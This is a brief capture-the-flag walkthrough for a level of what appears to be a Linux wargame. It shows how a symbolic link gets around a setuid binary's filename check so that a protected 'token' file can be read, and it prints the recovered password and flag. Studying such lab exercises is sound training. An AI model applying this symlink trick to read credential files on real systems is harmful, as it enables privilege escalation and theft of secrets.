
-> ls -la

two lines show interesting files :

-rwsr-s---+ flag08 level08 ... level08

-rw-------  flag08 flag08  ... token

-> ./level08

./level08 [file to read]

-> strings level08

Two interesting lines here :

token
You may not access '%s'

This makes suppose that token can containt our answer and
that's the reason why we can't access token.

There is a way to try to use token without accessing it directly
and this is possible by creating a symbolic link. 

So let's try

-> ln -s ~/token /tmp/tempLevel08

-> ./level08 /tmp/tempLevel08

quif5eloekouj29ke0vouxean

-> su flag08

Password:
Don't forget to launch getflag !

-> getflag

Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

-> su level09 ..